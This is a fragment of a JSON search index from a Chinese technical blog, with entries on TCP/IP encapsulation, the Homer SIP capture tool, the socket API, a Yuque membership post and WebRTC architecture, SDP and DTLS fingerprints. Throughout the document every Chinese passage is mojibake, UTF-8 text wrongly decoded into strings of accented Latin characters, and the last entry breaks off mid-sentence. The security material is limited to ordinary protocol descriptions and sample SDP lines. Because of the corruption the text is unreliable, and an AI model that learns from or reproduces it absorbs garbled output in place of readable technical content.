åº”ç”¨å±‚å’Œä¼ è¾“å±‚ä½¿ç”¨ç«¯åˆ°ç«¯çš„åè®® ç½‘ç»œå±‚æä¾›é€è·³çš„åè®® ç½‘æ¡¥åœ¨é“¾è·¯å±‚æ¥è¿æ¥ç½‘ç»œ è·¯ç”±å™¨åœ¨ç½‘ç»œå±‚è¿æ¥ç½‘ç»œ ä»¥å¤ªç½‘æ•°æ®å¸§çš„ç‰©ç†ç‰¹æ€§æ˜¯é•¿åº¦å¿…é¡»åœ¨46-1500å­—èŠ‚ä¹‹é—´ å°è£… ä»¥å¤ªç½‘å¸§ç”¨æ¥å°è£…IPæ•°æ®æŠ¥ã€‚\nIPæ•°æ®æŠ¥ = IPé¦–éƒ¨(20å­—èŠ‚) + TCPé¦–éƒ¨(20å­—èŠ‚) + åº”ç”¨æ•°æ® # é’ˆå¯¹TCP IPæ•°æ®æŠ¥ = IPé¦–éƒ¨(20å­—èŠ‚) + UDPé¦–éƒ¨(8å­—èŠ‚) + åº”ç”¨æ•°æ® # é’ˆå¯¹UDP ä»¥å¤ªç½‘å¸§ = ä»¥å¤ªç½‘é¦–éƒ¨(14å­—èŠ‚) + IPæ•°æ®æŠ¥(46-1500å­—èŠ‚) + ä»¥å¤ªç½‘å°¾éƒ¨(4å­—èŠ‚) IPæ•°æ®æŠ¥æœ€å¤§ä¸º1500å­—èŠ‚ï¼Œå‡å»20å­—èŠ‚IPé¦–éƒ¨ï¼Œ8å­—èŠ‚UDPé¦–éƒ¨ï¼Œç•™ç»™UDPåº”ç”¨æ•°æ®çš„åªæœ‰1472å­—èŠ‚ã€‚","title":"1 æ¦‚è¿°"},{"content":"ç›¸æ¯”äºsngrep, Homerèƒ½å¤Ÿä¿å­˜ä»å†å²è®°å½•ä¸­æœç´¢SIPåŒ…ä¿¡æ¯ã€‚é™¤æ­¤ä»¥å¤–ï¼ŒHomerå¯ä»¥å¾ˆæ–¹ä¾¿çš„ä¸OpenSIPSæˆ–FSè¿›è¡Œé›†æˆã€‚\næœ€ç²¾ç®€ç‰ˆæœ¬çš„Homeréƒ¨ç½²éœ€è¦ä¸‰ä¸ªæœåŠ¡ã€‚\npostgres æ•°æ®åº“ï¼Œç”¨æ¥å­˜å‚¨SIPä¿¡æ¯ heplify-server ç”¨æ¥å¤„ç†Hepæ¶ˆæ¯ï¼Œå­˜å‚¨åˆ°æ•°æ®åº“ homer-app å‰ç«¯æœç´¢æŸ¥è¯¢ç•Œé¢ è¿™ä¸‰ä¸ªæœåŠ¡éƒ½å¯ä»¥ç”¨dockeré•œåƒçš„æ–¹å¼éƒ¨ç½²ï¼Œéå¸¸æ–¹ä¾¿ã€‚\nè¯´å®è¯ï¼šhomerå®é™…ä¸Šå¹¶ä¸å¥½ç”¨ã€‚ä½ å¯ä»¥å¯¹æ¯”ä¸€ä¸‹siphubå°±çŸ¥é“äº†ã€‚\nå‚è€ƒèµ„æ–™ https://blog.opensips.org/2017/03/22/capturing-beyond-sip/https://www.opensips.org/Documentation/Tutorials-Tracing\n","permalink":"https://wdd.js.org/opensips/tools/homer/","summary":"ç›¸æ¯”äºsngrep, Homerèƒ½å¤Ÿä¿å­˜ä»å†å²è®°å½•ä¸­æœç´¢SIPåŒ…ä¿¡æ¯ã€‚é™¤æ­¤ä»¥å¤–ï¼ŒHomerå¯ä»¥å¾ˆæ–¹ä¾¿çš„ä¸OpenSIPSæˆ–FSè¿›è¡Œé›†æˆã€‚\næœ€ç²¾ç®€ç‰ˆæœ¬çš„Homeréƒ¨ç½²éœ€è¦ä¸‰ä¸ªæœåŠ¡ã€‚\npostgres æ•°æ®åº“ï¼Œç”¨æ¥å­˜å‚¨SIPä¿¡æ¯ heplify-server ç”¨æ¥å¤„ç†Hepæ¶ˆæ¯ï¼Œå­˜å‚¨åˆ°æ•°æ®åº“ homer-app å‰ç«¯æœç´¢æŸ¥è¯¢ç•Œé¢ è¿™ä¸‰ä¸ªæœåŠ¡éƒ½å¯ä»¥ç”¨dockeré•œåƒçš„æ–¹å¼éƒ¨ç½²ï¼Œéå¸¸æ–¹ä¾¿ã€‚\nè¯´å®è¯ï¼šhomerå®é™…ä¸Šå¹¶ä¸å¥½ç”¨ã€‚ä½ å¯ä»¥å¯¹æ¯”ä¸€ä¸‹siphubå°±çŸ¥é“äº†ã€‚\nå‚è€ƒèµ„æ–™ https://blog.opensips.org/2017/03/22/capturing-beyond-sip/https://www.opensips.org/Documentation/Tutorials-Tracing","title":"homer: ç»Ÿä¸€çš„sipåŒ…é›†ä¸­å¤„ç†å·¥å…·"},{"content":"1 é¢å‘è¿æ¥å’Œé¢å‘éè¿æ¥çš„åŒºåˆ«ï¼Ÿ é¢å‘è¿æ¥ä¸é¢å‘éè¿æ¥å¹¶ä¸æ˜¯æŒ‡çš„ç‰©ç†ä»‹è´¨ï¼Œè€Œæ˜¯æŒ‡çš„åˆ†ç»„æ•°æ®åŒ…ã€‚è€Œå®é™…ä¸Šï¼Œè¿æ¥åªæ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„æ¦‚å¿µã€‚\næ•°æ®åœ¨å‘é€å‰ï¼Œä¼šè¢«åˆ†ç»„å‘é€ã€‚å¯¹äºé¢å‘è¿æ¥çš„åè®®æ¥è¯´ï¼Œæ¯ä¸ªåˆ†ç»„ä¹‹é—´éƒ½æœ‰é¡ºåºçš„ï¼Œåˆ†ç»„ä¼šå­˜å‚¨è‡ªå·±çš„ä½ç½®ä¿¡æ¯ã€‚\nå¯ä»¥ç†è§£åœ¨åŒä¸€æ—¶é—´åªç»´æŒä¸€æ®µå…³ç³»ã€‚\né¢å‘éè¿æ¥åè®®ï¼Œåˆ†ç»„ç›´æ¥å¹¶æ— ä»»ä½•å…³ç³»ï¼Œæ¯ä¸ªåˆ†ç»„éƒ½æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚å¯ä»¥ç†è§£ä¸ºè„šè¸å¤šæ¡èˆ¹ã€‚\n","permalink":"https://wdd.js.org/network/kttu4i/","summary":"1 é¢å‘è¿æ¥å’Œé¢å‘éè¿æ¥çš„åŒºåˆ«ï¼Ÿ é¢å‘è¿æ¥ä¸é¢å‘éè¿æ¥å¹¶ä¸æ˜¯æŒ‡çš„ç‰©ç†ä»‹è´¨ï¼Œè€Œæ˜¯æŒ‡çš„åˆ†ç»„æ•°æ®åŒ…ã€‚è€Œå®é™…ä¸Šï¼Œè¿æ¥åªæ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„æ¦‚å¿µã€‚\næ•°æ®åœ¨å‘é€å‰ï¼Œä¼šè¢«åˆ†ç»„å‘é€ã€‚å¯¹äºé¢å‘è¿æ¥çš„åè®®æ¥è¯´ï¼Œæ¯ä¸ªåˆ†ç»„ä¹‹é—´éƒ½æœ‰é¡ºåºçš„ï¼Œåˆ†ç»„ä¼šå­˜å‚¨è‡ªå·±çš„ä½ç½®ä¿¡æ¯ã€‚\nå¯ä»¥ç†è§£åœ¨åŒä¸€æ—¶é—´åªç»´æŒä¸€æ®µå…³ç³»ã€‚\né¢å‘éè¿æ¥åè®®ï¼Œåˆ†ç»„ç›´æ¥å¹¶æ— ä»»ä½•å…³ç³»ï¼Œæ¯ä¸ªåˆ†ç»„éƒ½æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚å¯ä»¥ç†è§£ä¸ºè„šè¸å¤šæ¡èˆ¹ã€‚","title":"æŠ€å·§1"},{"content":"å¥—æ¥å­—API SOCKET socket(int domain, int type, int protocol) Socket APIå’Œåè®®æ— å…³ï¼Œå³å¯ä»¥ç”¨æ¥åˆ›å»ºSocketï¼Œæ— è®ºæ˜¯TCPè¿˜æ˜¯UDPï¼Œè¿˜æ˜¯è¿›ç¨‹é—´çš„é€šä¿¡ï¼Œéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ¥å£åˆ›å»ºã€‚\ndomain è¡¨ç¤ºé€šä¿¡åŸŸï¼Œæœ€é•¿è§çš„æœ‰ä»¥ä¸‹ä¸¤ä¸ªåŸŸ AF_INET å› ç‰¹ç½‘é€šä¿¡ AF_LOCAL è¿›ç¨‹é—´é€šä¿¡ type è¡¨ç¤ºå¥—æ¥å­—çš„ç±»å‹ SOCK_STREAM å¯é çš„ã€å…¨åŒå·¥ã€é¢å‘è¿æ¥çš„ï¼Œå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„TCP SOCK_DGRAM ä¸å¯é ã€å°½åŠ›è€Œä¸ºçš„ï¼Œæ— è¿æ¥çš„ã€‚å®é™…ä¸ŠæŒ‡çš„å°±æ˜¯UDP SOCK_RAW å…è®¸å¯¹IPå±‚çš„æ•°æ®è¿›è¡Œè®¿é—®ã€‚ç”¨äºç‰¹æ®Šç›®çš„ï¼Œä¾‹å¦‚ICMP protocol è¡¨ç¤ºå…·ä½“é€šä¿¡åè®® TCP/IP æœ¬è‡ªåŒæ ¹ç”Ÿï¼\n","permalink":"https://wdd.js.org/network/base-socket/","summary":"å¥—æ¥å­—API SOCKET socket(int domain, int type, int protocol) Socket APIå’Œåè®®æ— å…³ï¼Œå³å¯ä»¥ç”¨æ¥åˆ›å»ºSocketï¼Œæ— è®ºæ˜¯TCPè¿˜æ˜¯UDPï¼Œè¿˜æ˜¯è¿›ç¨‹é—´çš„é€šä¿¡ï¼Œéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ¥å£åˆ›å»ºã€‚\ndomain è¡¨ç¤ºé€šä¿¡åŸŸï¼Œæœ€é•¿è§çš„æœ‰ä»¥ä¸‹ä¸¤ä¸ªåŸŸ AF_INET å› ç‰¹ç½‘é€šä¿¡ AF_LOCAL è¿›ç¨‹é—´é€šä¿¡ type è¡¨ç¤ºå¥—æ¥å­—çš„ç±»å‹ SOCK_STREAM å¯é çš„ã€å…¨åŒå·¥ã€é¢å‘è¿æ¥çš„ï¼Œå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„TCP SOCK_DGRAM ä¸å¯é ã€å°½åŠ›è€Œä¸ºçš„ï¼Œæ— è¿æ¥çš„ã€‚å®é™…ä¸ŠæŒ‡çš„å°±æ˜¯UDP SOCK_RAW å…è®¸å¯¹IPå±‚çš„æ•°æ®è¿›è¡Œè®¿é—®ã€‚ç”¨äºç‰¹æ®Šç›®çš„ï¼Œä¾‹å¦‚ICMP protocol è¡¨ç¤ºå…·ä½“é€šä¿¡åè®® TCP/IP æœ¬è‡ªåŒæ ¹ç”Ÿï¼","title":"åŸºæœ¬å¥—æ¥å­—APIå›é¡¾"},{"content":"","permalink":"https://wdd.js.org/posts/2019/11/bhbmum/","summary":"","title":"æ‰€æœ‰çš„å¤é•‡éƒ½æ˜¯ä¸€ä¸ªæ ·[todo]"},{"content":" ä»Šå¤©æ‰“å¼€è¯­é›€ï¼Œå‘ç°å·²ç»æœ‰äº†ä¼šå‘˜åŠŸèƒ½ã€‚è¯´å®åœ¨çš„ï¼Œç›¸æ¯”æ™®é€šç”¨æˆ·ï¼Œä¼šå‘˜çš„ä¼˜åŠ¿å¹¶ä¸å¤§ã€‚é™¤éä½ æ˜¯å“ªç§é‡åº¦æ–‡å­—æ§æ‚£è€…ï¼Œ10ä¸ªçŸ¥è¯†åº“å¹¶ä¸å¤Ÿä½ ç”¨äº†ã€‚\næˆ‘åœ¨å‡ºç°ä¼šå‘˜æœåŠ¡ä¹‹å‰ï¼Œå·²ç»æœ‰äº†å¤šäº10ä¸ªçŸ¥è¯†åº“ã€‚\nç›¸æ¯”äºå…è´¹æœåŠ¡ï¼Œæˆ‘æ›´å–œæ¬¢ä»˜è´¹çš„æœåŠ¡ã€‚å…è´¹çš„æœåŠ¡æ°¸è¿œæ˜¯æœ€è´µçš„æœåŠ¡ã€‚\nå¾ˆå¤šäººï¼Œå¯ä»¥ä¹°çˆ±å¥‡è‰ºçš„ä¼šå‘˜ã€ä¼˜é…·è§†é¢‘ã€è…¾è®¯è§†é¢‘ã€äº¬ä¸œä¼šå‘˜ï¼Œä½†æ˜¯å¾€å¾€å¯¹äºèƒ½å¤ŸçœŸæ­£æå‡è‡ªå·±èƒ½åŠ›çš„æŠ•èµ„ï¼Œå¾€å¾€å®‰äºå…è´¹ï¼Œä¸å¿ä»˜å‡ºã€‚\né™¤éæ˜¯åŠ¨è¾„å‡ åƒçš„ä¼šå‘˜ï¼Œæˆ‘ä¼šè€ƒè™‘è‡ªå·±æ˜¯å¦çœŸæ­£éœ€è¦ã€‚ä¸€ç™¾å·¦å³çš„å¹´è´¹ä¼šå‘˜ï¼Œåœ¨ä¸Šæµ·ï¼Œä¹Ÿå°±æ˜¯å–ä¸‰å››æ¯å¥¶èŒ¶çš„ä»·é’±ã€‚\næ‰€ä»¥ï¼Œæˆ‘å°±ä¹°äº†ä¼šå‘˜ã€‚\nä¹°äº†ä¼šå‘˜æœ‰ä»€ä¹ˆæ„Ÿè§‰ï¼Œæ„Ÿè§‰æˆ‘å¯èƒ½ä¼šå¤šåˆ›å»ºå‡ ä¸ªçŸ¥è¯†åº“å§ã€‚\n","permalink":"https://wdd.js.org/posts/2019/11/gonmzq/","summary":"ä»Šå¤©æ‰“å¼€è¯­é›€ï¼Œå‘ç°å·²ç»æœ‰äº†ä¼šå‘˜åŠŸèƒ½ã€‚è¯´å®åœ¨çš„ï¼Œç›¸æ¯”æ™®é€šç”¨æˆ·ï¼Œä¼šå‘˜çš„ä¼˜åŠ¿å¹¶ä¸å¤§ã€‚é™¤éä½ æ˜¯å“ªç§é‡åº¦æ–‡å­—æ§æ‚£è€…ï¼Œ10ä¸ªçŸ¥è¯†åº“å¹¶ä¸å¤Ÿä½ ç”¨äº†ã€‚\næˆ‘åœ¨å‡ºç°ä¼šå‘˜æœåŠ¡ä¹‹å‰ï¼Œå·²ç»æœ‰äº†å¤šäº10ä¸ªçŸ¥è¯†åº“ã€‚\nç›¸æ¯”äºå…è´¹æœåŠ¡ï¼Œæˆ‘æ›´å–œæ¬¢ä»˜è´¹çš„æœåŠ¡ã€‚å…è´¹çš„æœåŠ¡æ°¸è¿œæ˜¯æœ€è´µçš„æœåŠ¡ã€‚\nå¾ˆå¤šäººï¼Œå¯ä»¥ä¹°çˆ±å¥‡è‰ºçš„ä¼šå‘˜ã€ä¼˜é…·è§†é¢‘ã€è…¾è®¯è§†é¢‘ã€äº¬ä¸œä¼šå‘˜ï¼Œä½†æ˜¯å¾€å¾€å¯¹äºèƒ½å¤ŸçœŸæ­£æå‡è‡ªå·±èƒ½åŠ›çš„æŠ•èµ„ï¼Œå¾€å¾€å®‰äºå…è´¹ï¼Œä¸å¿ä»˜å‡ºã€‚\né™¤éæ˜¯åŠ¨è¾„å‡ åƒçš„ä¼šå‘˜ï¼Œæˆ‘ä¼šè€ƒè™‘è‡ªå·±æ˜¯å¦çœŸæ­£éœ€è¦ã€‚ä¸€ç™¾å·¦å³çš„å¹´è´¹ä¼šå‘˜ï¼Œåœ¨ä¸Šæµ·ï¼Œä¹Ÿå°±æ˜¯å–ä¸‰å››æ¯å¥¶èŒ¶çš„ä»·é’±ã€‚\næ‰€ä»¥ï¼Œæˆ‘å°±ä¹°äº†ä¼šå‘˜ã€‚\nä¹°äº†ä¼šå‘˜æœ‰ä»€ä¹ˆæ„Ÿè§‰ï¼Œæ„Ÿè§‰æˆ‘å¯èƒ½ä¼šå¤šåˆ›å»ºå‡ ä¸ªçŸ¥è¯†åº“å§ã€‚","title":"ä¹°äº†è¯­é›€ä¼šå‘˜æ˜¯æ€æ ·ä½“éªŒï¼Ÿ"},{"content":"WebRTC åŠŸèƒ½ éŸ³é¢‘è§†é¢‘é€šè¯ è§†é¢‘ä¼šè®® æ•°æ®ä¼ è¾“ WebRTC æ¶æ„ å¯¹ç­‰å®ä½“ä¹‹é—´é€šè¿‡ä¿¡ä»¤æœåŠ¡ä¼ é€’ä¿¡ä»¤ å¯¹ç­‰å®ä½“ä¹‹é—´çš„åª’ä½“æµå¯ä»¥ç›´æ¥ä¼ é€’ï¼Œæ— éœ€ä¸­é—´æœåŠ¡å™¨ å†…éƒ¨ç»“æ„ ç´«è‰²éƒ¨åˆ†æ˜¯Webå¼€å‘è€…APIå±‚ è“è‰²å®çº¿éƒ¨åˆ†æ˜¯é¢å‘æµè§ˆå™¨å‚å•†çš„APIå±‚ è“è‰²è™šçº¿éƒ¨åˆ†æµè§ˆå™¨å‚å•†å¯ä»¥è‡ªå®šä¹‰å®ç° WebRTCæœ‰ä¸‰ä¸ªæ¨¡å—ï¼š\nVoice Engineï¼ˆéŸ³é¢‘å¼•æ“ï¼‰ Voice EngineåŒ…å«iSAC/iLBC Codecï¼ˆéŸ³é¢‘ç¼–è§£ç å™¨ï¼Œå‰è€…æ˜¯é’ˆå¯¹å®½å¸¦å’Œè¶…å®½å¸¦ï¼Œåè€…æ˜¯é’ˆå¯¹çª„å¸¦ï¼‰ NetEQ for voiceï¼ˆå¤„ç†ç½‘ç»œæŠ–åŠ¨å’Œè¯­éŸ³åŒ…ä¸¢å¤±ï¼‰ Echo Cancelerï¼ˆå›å£°æ¶ˆé™¤å™¨ï¼‰/ Noise Reductionï¼ˆå™ªå£°æŠ‘åˆ¶ï¼‰ Video Engineï¼ˆè§†é¢‘å¼•æ“ï¼‰ VP8 Codecï¼ˆè§†é¢‘å›¾åƒç¼–è§£ç å™¨ï¼‰ Video jitter bufferï¼ˆè§†é¢‘æŠ–åŠ¨ç¼“å†²å™¨ï¼Œå¤„ç†è§†é¢‘æŠ–åŠ¨å’Œè§†é¢‘ä¿¡æ¯åŒ…ä¸¢å¤±ï¼‰ Image enhancementsï¼ˆå›¾åƒè´¨é‡å¢å¼ºï¼‰ Transport SRTPï¼ˆå®‰å…¨çš„å®æ—¶ä¼ è¾“åè®®ï¼Œç”¨ä»¥éŸ³è§†é¢‘æµä¼ è¾“ï¼‰ Multiplexingï¼ˆå¤šè·¯å¤ç”¨ï¼‰ P2Pï¼ŒSTUN+TURN+ICEï¼ˆç”¨äºNATç½‘ç»œå’Œé˜²ç«å¢™ç©¿è¶Šçš„ï¼‰ é™¤æ­¤ä¹‹å¤–ï¼Œå®‰å…¨ä¼ è¾“å¯èƒ½è¿˜ä¼šç”¨åˆ°DTLSï¼ˆæ•°æ®æŠ¥å®‰å…¨ä¼ è¾“ï¼‰ï¼Œç”¨äºåŠ å¯†ä¼ è¾“å’Œå¯†é’¥åå•† æ•´ä¸ªWebRTCé€šä¿¡æ˜¯åŸºäºUDPçš„ WebRTC å¦‚ä½•é€šä¿¡ getUserMediaç”¨æ¥æ•è·æœ¬åœ°çš„è¯­éŸ³æµæˆ–è€…è§†é¢‘æµ RTCPeerConnectionç”¨æ¥ä»£è¡¨WebRTCé“¾æ¥ï¼Œç”¨æ¥å¤„ç†å¯¹ç­‰å®ä½“ä¹‹é—´çš„æµæ•°æ® RTCDataChannel ç”¨æ¥ä¼ é€’å„ç§æ•°æ® WebRTC çš„æ ¸å¿ƒç»„ä»¶ éŸ³è§†é¢‘å¼•æ“ï¼šOPUSã€VP8 / VP9ã€H264 ä¼ è¾“å±‚åè®®ï¼šåº•å±‚ä¼ è¾“åè®®ä¸º UDP åª’ä½“åè®®ï¼šSRTP / SRTCP æ•°æ®åè®®ï¼šDTLS / SCTP P2P å†…ç½‘ç©¿é€ï¼šSTUN / TURN / ICE / Trickle ICE ä¿¡ä»¤ä¸ SDP åå•†ï¼šHTTP / WebSocket / SIPã€ Offer Answer æ¨¡å‹ WebRTC éŸ³é¢‘å’Œè§†é¢‘å¼•æ“ æœ€åº•å±‚æ˜¯ç¡¬ä»¶è®¾å¤‡ï¼Œä¸Šé¢æ˜¯éŸ³é¢‘æ•è·æ¨¡å—å’Œè§†é¢‘æ•è·æ¨¡å— ä¸­é—´éƒ¨åˆ†ä¸ºéŸ³è§†é¢‘å¼•æ“ã€‚éŸ³é¢‘å¼•æ“è´Ÿè´£éŸ³é¢‘é‡‡é›†å’Œä¼ è¾“ï¼Œå…·æœ‰é™å™ªã€å›å£°æ¶ˆé™¤ç­‰åŠŸèƒ½ã€‚è§†é¢‘å¼•æ“è´Ÿè´£ç½‘ç»œæŠ–åŠ¨ä¼˜åŒ–ï¼Œäº’è”ç½‘ä¼ è¾“ç¼–è§£ç ä¼˜åŒ– åœ¨éŸ³è§†é¢‘å¼•æ“ä¹‹ä¸Šæ˜¯ ä¸€å¥— C++ APIï¼Œåœ¨ C++ çš„ API ä¹‹ä¸Šæ˜¯æä¾›ç»™æµè§ˆå™¨çš„Javascript API WebRTC åº•å±‚åè®® WebRTC æ ¸å¿ƒçš„åè®®éƒ½æ˜¯åœ¨å³ä¾§åŸºäº UDP åŸºç¡€ä¸Šæ­å»ºèµ·æ¥çš„ å…¶ä¸­ï¼ŒICEã€STUNã€TURN ç”¨äºå†…ç½‘ç©¿é€, è§£å†³äº†è·å–ä¸ç»‘å®šå¤–ç½‘æ˜ å°„åœ°å€ï¼Œä»¥åŠ keep alive æœºåˆ¶ DTLS ç”¨äºå¯¹ä¼ è¾“å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥çœ‹åšæ˜¯ UDP ç‰ˆçš„ TLSã€‚ç”±äº WebRTC å¯¹å®‰å…¨æ¯”è¾ƒé‡è§†ï¼Œè¿™ä¸€å±‚æ˜¯å¿…é¡»çš„ã€‚æ‰€æœ‰WebRTCç»„ä»¶éƒ½å¿…é¡»åŠ å¯†ï¼Œå¹¶ä¸”å…¶JavaScript APIåªèƒ½ç”¨äºå®‰å…¨æºï¼ˆHTTPSæˆ–æœ¬åœ°ä¸»æœºï¼‰ã€‚ä¿¡ä»¤æœºåˆ¶å¹¶ä¸æ˜¯ç”±WebRTCæ ‡å‡†å®šä¹‰çš„ï¼Œæ‰€ä»¥æ‚¨å¿…é¡»ç¡®ä¿ä½¿ç”¨å®‰å…¨åè®®ã€‚ SRTP ä¸ SRTCP æ˜¯å¯¹åª’ä½“æ•°æ®çš„å°è£…ä¸ä¼ è¾“æ§åˆ¶åè®® SCTP æ˜¯æµæ§åˆ¶ä¼ è¾“åè®®ï¼Œæä¾›ç±»ä¼¼ TCP çš„ç‰¹æ€§ï¼ŒSCTP å¯ä»¥åŸºäº UDP ä¸Šæ„å»ºï¼Œåœ¨ WebRTC é‡Œæ˜¯åœ¨ DTLS åè®®ä¹‹ä¸Š RTCPeerConnection ç”¨æ¥å»ºç«‹å’Œç»´æŠ¤ç«¯åˆ°ç«¯è¿æ¥ï¼Œå¹¶æä¾›é«˜æ•ˆçš„éŸ³è§†é¢‘æµä¼ è¾“ RTCDataChannel ç”¨æ¥æ”¯æŒç«¯åˆ°ç«¯çš„ä»»æ„äºŒè¿›åˆ¶æ•°æ®ä¼ è¾“ WebRTC åè®®æ ˆè§£é‡Š ICEï¼šäº’åŠ¨å¼è¿æ¥å»ºç«‹ï¼ˆRFC 5245ï¼‰ STUNï¼šç”¨äºNATçš„ä¼šè¯éå†å®ç”¨ç¨‹åºï¼ˆRFC 5389ï¼‰ TURNï¼šåœ¨NATå‘¨å›´ä½¿ç”¨ç»§ç”µå™¨è¿›è¡Œéå†ï¼ˆRFC 5766ï¼‰ SDPï¼šä¼šè¯æè¿°åè®®ï¼ˆRFC 4566ï¼‰ DTLSï¼šæ•°æ®æŠ¥ä¼ è¾“å±‚å®‰å…¨æ€§ï¼ˆRFC 6347ï¼‰ SCTPï¼šæµæ§åˆ¶ä¼ è¾“åè®®ï¼ˆRFC 4960ï¼‰ SRTPï¼šå®‰å…¨å®æ—¶ä¼ è¾“åè®®ï¼ˆRFC 3711ï¼‰ æµè§ˆå™¨å’ŒæŸäº›éæµè§ˆå™¨ä¹‹é—´çš„å‘¼å«ï¼Œæœ‰äº›æ—¶å€™ä»¥ä¸ºæ²¡æœ‰DTLSæŒ‡çº¹ï¼Œè€Œå¯¼è‡´å‘¼å«å¤±è´¥ã€‚å¦‚ä¸‹å›¾ä½¿ç”¨JsSIP, ä¸€ä¸ªsipPhoneå’ŒWebRTCä¹‹é—´çš„å‘¼å«ï¼Œå› ä¸ºæ²¡æœ‰æºå¸¦DTLSæŒ‡çº¹è€Œå¯¼è‡´å‘¼å«å¤±è´¥ã€‚\nemit \u0026ldquo;peerconnection:setremotedescriptionfailed\u0026rdquo; [error**:DOMException:**** Failed to execute \u0026lsquo;setRemoteDescription\u0026rsquo; on \u0026lsquo;RTCPeerConnection\u0026rsquo;:**** Failed to set remote offer sdp****:**** Called with SDP without DTLS fingerprint.**\nä¸€ä¸ªå®Œæ•´çš„SIP INVITEä¿¡ä»¤ã€‚å…¶ä¸­a=fingerprint:sha-256å­—æ®µè¡¨ç¤ºDTLSæŒ‡çº¹ã€‚\na=fingerprint:sha-256 74:CD:F4:A0:3B:46:01:1C:0C:5D:04:D0:17:E5:A4:A1:04:35:97:1C:34:A3:61:60:79:52:02:F3:05:9E:7D:FE\nSDP: Session Description Protocol SDPåè®®ç”¨æ¥åå•†ä¸¤ä¸ªSIP UAä¹‹é—´èƒ½åŠ›ï¼Œä¾‹å¦‚åª’ä½“ç¼–è§£ç èƒ½åŠ›ã€‚sdpåè®®ä¸¾ä¾‹ã€‚sdpåè®®çš„è¯¦ç»†ä»‹ç»å¯ä»¥å‚è€ƒ RFC4566\nv=0 o=- 7158718066157017333 2 IN IP4 127.0.0.1 s=- t=0 0 a=group:BUNDLE 0 a=msid-semantic: WMS byn72RFJBCUzdSPhnaBU4vSz7LFwfwNaF2Sy m=audio 64030 UDP/TLS/RTP/SAVPF 111 103 104 9 0 8 106 105 13 110 112 113 126 c=IN IP4 192.168.2.180 Protocol Version (\u0026ldquo;v=\u0026rdquo;) Origin (\u0026ldquo;o=\u0026rdquo;) Session Name (\u0026ldquo;s=\u0026rdquo;) Session Information (\u0026ldquo;i=\u0026rdquo;) URI (\u0026ldquo;u=\u0026rdquo;) Email Address and Phone Number (\u0026ldquo;e=\u0026rdquo; and \u0026ldquo;p=\u0026rdquo;) Connection Data (\u0026ldquo;c=\u0026rdquo;) Bandwidth (\u0026ldquo;b=\u0026rdquo;) Timing (\u0026ldquo;t=\u0026rdquo;) Repeat Times (\u0026ldquo;r=\u0026rdquo;) Time Zones (\u0026ldquo;z=\u0026rdquo;) Encryption Keys (\u0026ldquo;k=\u0026rdquo;) Attributes (\u0026ldquo;a=\u0026rdquo;) Media Descriptions (\u0026ldquo;m=\u0026rdquo;) åŠ å¯† WebRTCå¯¹å®‰å…¨æ€§æ˜¯è¦æ±‚éå¸¸é«˜çš„ã€‚æ— è®ºæ˜¯ä¿¡ä»¤è¿˜æ˜¯ä¸è¯­éŸ³æµï¼ŒWebRTCè¦æ±‚ä¿¡æ¯ä¼ é€’å¿…é¡»åŠ å¯†ã€‚\næ•°æ®æµä½¿ç”¨DTLSåè®® åª’ä½“æµä½¿ç”¨SRTP JavaScript API getUserMedia()ï¼šæ•æ‰éŸ³é¢‘å’Œè§†é¢‘ RTCPeerConnectionï¼šåœ¨ç”¨æˆ·ä¹‹é—´æµå¼ä¼ è¾“éŸ³é¢‘å’Œè§†é¢‘ RTCDataChannelï¼šåœ¨ç”¨æˆ·ä¹‹é—´ä¼ è¾“æ•°æ® MediaRecorderï¼šå½•åˆ¶éŸ³é¢‘å’Œè§†é¢‘ å‚è€ƒ WebRTCå®˜ç½‘ WebRTCä¸­æ–‡ç½‘ ä¸€æ­¥ä¸€æ­¥å­¦ä¹ WebRTC A Study of WebRTC Security ","permalink":"https://wdd.js.org/opensips/ch9/notes/","summary":"WebRTC åŠŸèƒ½ éŸ³é¢‘è§†é¢‘é€šè¯ è§†é¢‘ä¼šè®® æ•°æ®ä¼ è¾“ WebRTC æ¶æ„ å¯¹ç­‰å®ä½“ä¹‹é—´é€šè¿‡ä¿¡ä»¤æœåŠ¡ä¼ é€’ä¿¡ä»¤ å¯¹ç­‰å®ä½“ä¹‹é—´çš„åª’ä½“æµå¯ä»¥ç›´æ¥ä¼ é€’ï¼Œæ— éœ€ä¸­é—´æœåŠ¡å™¨ å†…éƒ¨ç»“æ„ ç´«è‰²éƒ¨åˆ†æ˜¯Webå¼€å‘è€…APIå±‚ è“è‰²å®çº¿éƒ¨åˆ†æ˜¯é¢å‘æµè§ˆå™¨å‚å•†çš„APIå±‚ è“è‰²è™šçº¿éƒ¨åˆ†æµè§ˆå™¨å‚å•†å¯ä»¥è‡ªå®šä¹‰å®ç° WebRTCæœ‰ä¸‰ä¸ªæ¨¡å—ï¼š\nVoice Engineï¼ˆéŸ³é¢‘å¼•æ“ï¼‰ Voice EngineåŒ…å«iSAC/iLBC Codecï¼ˆéŸ³é¢‘ç¼–è§£ç å™¨ï¼Œå‰è€…æ˜¯é’ˆå¯¹å®½å¸¦å’Œè¶…å®½å¸¦ï¼Œåè€…æ˜¯é’ˆå¯¹çª„å¸¦ï¼‰ NetEQ for voiceï¼ˆå¤„ç†ç½‘ç»œæŠ–åŠ¨å’Œè¯­éŸ³åŒ…ä¸¢å¤±ï¼‰ Echo Cancelerï¼ˆå›å£°æ¶ˆé™¤å™¨ï¼‰/ Noise Reductionï¼ˆå™ªå£°æŠ‘åˆ¶ï¼‰ Video Engineï¼ˆè§†é¢‘å¼•æ“ï¼‰ VP8 Codecï¼ˆè§†é¢‘å›¾åƒç¼–è§£ç å™¨ï¼‰ Video jitter bufferï¼ˆè§†é¢‘æŠ–åŠ¨ç¼“å†²å™¨ï¼Œå¤„ç†è§†é¢‘æŠ–åŠ¨å’Œè§†é¢‘ä¿¡æ¯åŒ…ä¸¢å¤±ï¼‰ Image enhancementsï¼ˆå›¾åƒè´¨é‡å¢å¼ºï¼‰ Transport SRTPï¼ˆå®‰å…¨çš„å®æ—¶ä¼ è¾“åè®®ï¼Œç”¨ä»¥éŸ³è§†é¢‘æµä¼ 